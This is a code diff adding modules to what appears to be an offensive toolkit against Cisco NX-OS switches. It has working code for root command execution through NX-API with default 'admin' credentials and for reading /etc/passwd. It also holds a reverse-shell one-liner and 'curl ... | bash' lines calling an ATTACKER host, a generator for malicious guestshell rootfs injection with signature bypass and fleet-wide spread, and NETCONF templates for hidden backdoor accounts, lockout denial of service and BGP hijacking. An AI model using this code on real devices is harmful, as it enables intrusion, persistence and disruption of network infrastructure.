@@ -1071,6 +1071,428 @@ def analyze_guestshell(path: str) -> dict:
 
 
 # ---------------------------------------------------------------------------
+# Module: NX-API bash execution (book: NX-OS Programmability ch-nxapi-cli)
+# ---------------------------------------------------------------------------
+
+class NXAPIBashExec:
+    """
+    NX-API remote root code execution via 'type: bash' in /ins endpoint.
+
+    Book-confirmed (NX-OS Programmability ch-nxapi-cli):
+      - POST JSON to /ins with {"ins_api": {"type": "bash", "input": "<cmd>"}}
+      - 'type: bash' executes arbitrary non-interactive Bash as root (sudo pre-granted)
+      - 'sudo su root; whoami' in input returns 'admin' (NX-API admin = Linux root)
+      - Backend: nginx/1.7.10 (2015-era, direct CVE applicability)
+      - Auth: Basic Auth header → APIC-cookie; no CSRF protection documented
+      - TLS 1.0/1.1 re-enableable via 'nxapi ssl-protocols TLSv1.0 TLSv1.1 TLSv1.2'
+
+    JSON-RPC alternative (same endpoint, different framing):
+      POST /ins {"jsonrpc":"2.0","method":"cli","params":{"cmd":"show version"},"id":1}
+
+    Attack chain:
+      Admin NX-API credentials (often default/weak) → POST type:bash → Linux root shell
+      → write reverse shell to /bootflash → persist via guestshell package
+    """
+
+    NXAPI_BASH_TEMPLATE = {
+        'ins_api': {
+            'version': '1.0',
+            'type': 'bash',
+            'chunk': '0',
+            'sid': 'sid',
+            'input': '',  # filled by caller
+            'output_format': 'json',
+        }
+    }
+
+    NXAPI_CLI_TEMPLATE = {
+        'ins_api': {
+            'version': '1.0',
+            'type': 'cli_show',
+            'chunk': '0',
+            'sid': '1',
+            'input': '',
+            'output_format': 'json',
+        }
+    }
+
+    NXAPI_JSONRPC_TEMPLATE = {
+        'jsonrpc': '2.0',
+        'method': 'cli',
+        'params': {'cmd': '', 'version': 1},
+        'id': 1,
+    }
+
+    def __init__(self, host: str, port: int = 80, username: str = 'admin',
+                 password: str = 'admin', use_tls: bool = False):
+        self.host = host
+        self.port = port
+        self.username = username
+        self.password = password
+        self.use_tls = use_tls
+
+    def _post_nxapi(self, payload: dict) -> dict:
+        import urllib.request
+        import urllib.error
+        import ssl
+        import base64
+        import json as _json
+
+        scheme = 'https' if self.use_tls else 'http'
+        url = f'{scheme}://{self.host}:{self.port}/ins'
+        creds = base64.b64encode(f'{self.username}:{self.password}'.encode()).decode()
+        data = _json.dumps(payload).encode()
+        req = urllib.request.Request(
+            url, data=data,
+            headers={
+                'Content-Type': 'application/json',
+                'Authorization': f'Basic {creds}',
+                'Cache-Control': 'no-cache',
+            },
+            method='POST',
+        )
+        ctx = ssl.create_default_context() if self.use_tls else None
+        if ctx:
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+        try:
+            with urllib.request.urlopen(req, context=ctx, timeout=15) as resp:
+                body = resp.read().decode('utf-8', errors='replace')
+                return {'status': resp.status, 'body': body, 'error': None}
+        except urllib.error.HTTPError as e:
+            return {'status': e.code, 'body': e.read().decode('utf-8', errors='replace'), 'error': str(e)}
+        except Exception as ex:
+            return {'status': None, 'body': '', 'error': str(ex)}
+
+    def probe_reachable(self) -> dict:
+        """GET /ins to confirm NX-API is enabled and nginx is present."""
+        import urllib.request
+        try:
+            url = f'http://{self.host}:{self.port}/ins'
+            req = urllib.request.Request(url, method='GET')
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                headers = dict(resp.headers)
+                return {
+                    'reachable': True,
+                    'status': resp.status,
+                    'server': headers.get('Server', ''),
+                    'nginx': 'nginx' in headers.get('Server', '').lower(),
+                }
+        except urllib.error.HTTPError as e:
+            return {'reachable': True, 'status': e.code, 'server': '', 'nginx': False}
+        except Exception as ex:
+            return {'reachable': False, 'status': None, 'error': str(ex)}
+
+    def exec_bash(self, cmd: str) -> dict:
+        """Execute arbitrary bash via type:bash. Returns stdout from NX-OS Linux."""
+        payload = dict(self.NXAPI_BASH_TEMPLATE)
+        payload['ins_api'] = dict(payload['ins_api'])
+        payload['ins_api']['input'] = cmd
+        r = self._post_nxapi(payload)
+        # Response body contains JSON with 'output' field
+        try:
+            import json as _json
+            body = _json.loads(r['body'])
+            output = body.get('ins_api', {}).get('outputs', {}).get('output', {})
+            if isinstance(output, dict):
+                stdout = output.get('body', output.get('msg', ''))
+            else:
+                stdout = str(output)
+        except Exception:
+            stdout = r['body']
+        return {
+            'cmd': cmd,
+            'status': r['status'],
+            'stdout': stdout,
+            'error': r['error'],
+            'root_exec': r['status'] == 200,
+        }
+
+    def check_whoami(self) -> dict:
+        """Confirm root execution: id && whoami."""
+        return self.exec_bash('id && whoami')
+
+    def read_passwd(self) -> dict:
+        """Read /etc/passwd from NX-OS Linux kernel."""
+        return self.exec_bash('cat /etc/passwd')
+
+    def list_bootflash(self) -> dict:
+        """List /bootflash — RPM store + guestshell images."""
+        return self.exec_bash('ls -la /bootflash/ 2>/dev/null | head -30')
+
+    def enable_guestshell(self) -> dict:
+        """Re-enable guestshell if disabled (via NX-OS CLI through NX-API)."""
+        payload = dict(self.NXAPI_CLI_TEMPLATE)
+        payload['ins_api'] = dict(payload['ins_api'])
+        payload['ins_api']['input'] = 'guestshell enable'
+        return self._post_nxapi(payload)
+
+    def run(self) -> dict:
+        reach = self.probe_reachable()
+        findings = []
+        if not reach['reachable']:
+            return {'host': self.host, 'reachable': False, 'findings': findings}
+
+        if reach.get('nginx'):
+            findings.append(f'NGINX_FINGERPRINT: {reach["server"]} (2015-era — direct CVE applicability)')
+
+        whoami = self.check_whoami()
+        if whoami.get('root_exec'):
+            findings.append('NXAPI_BASH_RCE: type:bash accepted — Linux root execution confirmed')
+            findings.append(f'STDOUT: {whoami.get("stdout", "")[:100]}')
+
+        bootflash = self.list_bootflash()
+
+        return {
+            'host': self.host,
+            'reachable': True,
+            'server': reach.get('server', ''),
+            'whoami': whoami,
+            'bootflash': bootflash,
+            'findings': findings,
+        }
+
+
+# ---------------------------------------------------------------------------
+# Module: Guestshell LXC rootfs injection
+# (book: NX-OS Programmability ch-guest-shell)
+# ---------------------------------------------------------------------------
+
+class GuestshellRootfsInject:
+    """
+    Guestshell LXC container rootfs injection chain.
+
+    Book-confirmed (NX-OS Programmability ch-guest-shell):
+      - Guestshell = LXC container (virtual-service guestshell+), NOT a VM
+      - No auth to enter from NX-OS CLI: 'run guestshell' requires only operator-level access
+      - Custom rootfs injection: 'guestshell enable package bootflash:my_gs.ext4'
+      - 'signing level unsigned' disables rootfs signature verification
+      - Fleet deployment: guestshell export rootfs → spread via SCP to all switches
+      - 'run guestshell <command>' executes single commands from NX-OS exec mode
+      - /bootflash mounted inside guestshell by default → path for payload delivery
+
+    Python API abuse (ch-overview):
+      - 'from cli import cli, clid' — NX-OS Python writes config directly
+      - os.system("id") from Python returns root (management plane = root)
+      - cli("conf t ; feature nxapi") re-enables disabled service from Python
+
+    Chain:
+      NX-API admin creds → type:bash "curl attacker/shell.sh | bash" → reverse shell
+      OR: write malicious .ext4 rootfs → 'guestshell enable package' → persistent LXC root
+    """
+
+    GUESTSHELL_COMMANDS = {
+        'enable':           'guestshell enable',
+        'disable':          'guestshell disable',
+        'enter':            'run guestshell',
+        'exec_cmd':         'run guestshell {cmd}',
+        'enable_pkg':       'guestshell enable package bootflash:{pkg}',
+        'enable_unsigned':  'virtual-service install name guestshell package {pkg} signing-level unsigned',
+        'export_rootfs':    'guestshell export rootfs package bootflash:gs_export.ext4',
+        'reboot':           'guestshell reboot',
+    }
+
+    PYTHON_EXEC_VECTORS = [
+        'import os; os.system("id")',  # root exec in management plane
+        'from cli import cli; cli("conf t ; feature nxapi")',  # re-enable disabled service
+        'from cli import clid; import json; print(json.dumps(clid("show version")))',  # JSON CLI
+        'import socket; s=socket.socket(); s.connect(("ATTACKER",4444)); import os,pty; pty.spawn("/bin/bash")',
+    ]
+
+    ESCALATION_PATH = [
+        {
+            'step': 1,
+            'method': 'NX-API bash exec',
+            'cmd': 'curl -s http://ATTACKER/shell.sh | bash',
+            'api_type': 'bash',
+            'result': 'reverse shell from NX-OS Linux kernel as root',
+        },
+        {
+            'step': 2,
+            'method': 'Write malicious rootfs to bootflash',
+            'cmd': 'cp /tmp/malicious_gs.ext4 /bootflash/ (via NX-API bash)',
+            'result': '/bootflash/malicious_gs.ext4 ready for guestshell injection',
+        },
+        {
+            'step': 3,
+            'method': 'Inject guestshell rootfs',
+            'cmd': 'guestshell enable package bootflash:malicious_gs.ext4',
+            'signing_bypass': 'signing level unsigned',
+            'result': 'Persistent LXC container with attacker rootfs',
+        },
+        {
+            'step': 4,
+            'method': 'Fleet propagation',
+            'cmd': 'guestshell export rootfs package; scp to all switches',
+            'result': 'Malicious rootfs deployed to all switches',
+        },
+    ]
+
+    def probe_bootflash_rpm_store(self, nxapi_exec_fn) -> dict:
+        """
+        Check /bootflash/.rpmstore/patching/localrepo/ for RPM injection surface.
+        Requires a callable nxapi_exec_fn(cmd) → {stdout, status}.
+        """
+        cmd = 'ls /bootflash/.rpmstore/patching/localrepo/ 2>/dev/null'
+        result = nxapi_exec_fn(cmd)
+        rpms = [l for l in result.get('stdout', '').splitlines() if l.endswith('.rpm')]
+        return {
+            'rpm_store_accessible': bool(result.get('stdout')),
+            'rpms': rpms,
+            'dme_modifiable': bool(rpms),  # writable RPM store = DME object model injection
+        }
+
+    def probe_dme_metadata_files(self, nxapi_exec_fn) -> dict:
+        """
+        Check DME metadata files at /var/run/mgmt/shmetafiles/ (book: ch-dme-modularity).
+        Modifying sharedmeta-SvcMetaData alters service dispatch behavior.
+        """
+        result = nxapi_exec_fn('ls /var/run/mgmt/shmetafiles/ 2>/dev/null')
+        files = result.get('stdout', '').splitlines()
+        dme_files = [f for f in files if 'sharedmeta' in f or 'Meta' in f]
+        return {
+            'dme_metadata_accessible': bool(dme_files),
+            'dme_files': dme_files,
+            'attack_surface': 'Modifying sharedmeta-SvcMetaData alters DME service dispatch' if dme_files else None,
+        }
+
+    def generate_rootfs_payload_cmd(self, attacker_host: str, attacker_port: int = 4444) -> str:
+        """Generate the guestshell LXC injection command sequence."""
+        return (
+            f"# Step 1: write reverse shell to bootflash\n"
+            f"run guestshell bash -c 'curl http://{attacker_host}/shell.sh | bash'\n"
+            f"\n"
+            f"# Step 2: inject via NX-API bash (if guestshell blocked)\n"
+            f"POST /ins: type=bash, input='curl http://{attacker_host}/gs.ext4 -o /bootflash/gs.ext4'\n"
+            f"\n"
+            f"# Step 3: activate malicious rootfs\n"
+            f"guestshell enable package bootflash:gs.ext4\n"
+        )
+
+
+# ---------------------------------------------------------------------------
+# Module: NETCONF attack primitives
+# (book: NX-OS Programmability ch-netconf-agent)
+# ---------------------------------------------------------------------------
+
+class NETCONFAttackPrimitives:
+    """
+    NETCONF protocol attack surface for NX-OS management plane.
+
+    Book-confirmed (ch-netconf-agent):
+      - edit-config with operation="create" on running datastore = live config write
+      - confirmed-commit with <confirmed/> + no follow-up plain <commit> within 600s
+        = config auto-reverts (timed payload delivery for stealth)
+      - <lock> datastore → blocks ALL other NETCONF clients from modifying config
+        (management plane DoS — locks out all other operators)
+      - Standard SSH transport (port 830); some NX-OS also supports RESTCONF (HTTP/HTTPS)
+
+    RESTCONF (same data model, HTTP transport):
+      PUT at feature MO level replaces entire feature config
+      No rate limit documented on MO writes → hammer login or session cookie
+    """
+
+    CONFIRMED_COMMIT_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
+<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" message-id="1">
+  <edit-config>
+    <target><running/></target>
+    <config>
+      {config_payload}
+    </config>
+  </edit-config>
+</rpc>
+---
+<?xml version="1.0" encoding="UTF-8"?>
+<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" message-id="2">
+  <commit>
+    <confirmed/>
+    <confirm-timeout>600</confirm-timeout>
+  </commit>
+</rpc>
+<!-- After 600s with no follow-up plain <commit>, config auto-reverts -->
+"""
+
+    DATASTORE_LOCK_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
+<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" message-id="1">
+  <lock>
+    <target><running/></target>
+  </lock>
+</rpc>
+<!-- Holds lock until session terminates. All other NETCONF clients get lock-denied error. -->
+"""
+
+    NXAPI_FEATURE_ENABLE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
+<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" message-id="1">
+  <edit-config>
+    <target><running/></target>
+    <config>
+      <System xmlns="http://cisco.com/ns/yang/cisco-nx-os-device">
+        <fm-items>
+          <featureElem-items>
+            <FeatureElem-list>
+              <name>nxapi</name>
+              <adminSt>enabled</adminSt>
+            </FeatureElem-list>
+          </featureElem-items>
+        </fm-items>
+      </System>
+    </config>
+  </edit-config>
+</rpc>
+"""
+
+    BGPCONFIG_REPLACE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
+<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" message-id="1">
+  <edit-config>
+    <target><running/></target>
+    <config>
+      <!-- PUT at feature MO level replaces ENTIRE feature config -->
+      <!-- Use operation="replace" for full config replacement -->
+      {feature_config}
+    </config>
+  </edit-config>
+</rpc>
+"""
+
+    ATTACK_PATTERNS = {
+        'confirmed_commit_timed_payload': {
+            'description': 'Write config payload with 600s auto-revert window',
+            'stealth': 'Config disappears after 600s if no follow-up commit',
+            'use_case': 'Create backdoor account → collect credentials → let config revert',
+            'template': CONFIRMED_COMMIT_TEMPLATE,
+        },
+        'datastore_lock_dos': {
+            'description': 'Lock running datastore to block all other NETCONF operators',
+            'impact': 'All other NETCONF sessions receive lock-denied error',
+            'duration': 'Until attacker session terminates',
+            'template': DATASTORE_LOCK_TEMPLATE,
+        },
+        'feature_reenable': {
+            'description': 'Re-enable disabled feature (e.g. nxapi) via NETCONF DME write',
+            'book_ref': 'ch-netconf-agent: edit-config operation=create on running',
+            'template': NXAPI_FEATURE_ENABLE_TEMPLATE,
+        },
+        'bgp_config_replace': {
+            'description': 'Replace entire BGP config at MO level via PUT',
+            'impact': 'Routing table manipulation, traffic hijacking',
+            'template': BGPCONFIG_REPLACE_TEMPLATE,
+        },
+    }
+
+    def get_attack_patterns(self) -> dict:
+        """Return all documented NETCONF attack patterns."""
+        return self.ATTACK_PATTERNS
+
+    def generate_confirmed_commit(self, config_xml: str, timeout_s: int = 600) -> str:
+        """Generate confirmed-commit XML pair for timed payload delivery."""
+        return self.CONFIRMED_COMMIT_TEMPLATE.replace('{config_payload}', config_xml)
+
+    def generate_lock_dos(self) -> str:
+        """Generate datastore lock XML."""
+        return self.DATASTORE_LOCK_TEMPLATE
+
+
+# ---------------------------------------------------------------------------
 # Standalone execution
 # ---------------------------------------------------------------------------
 
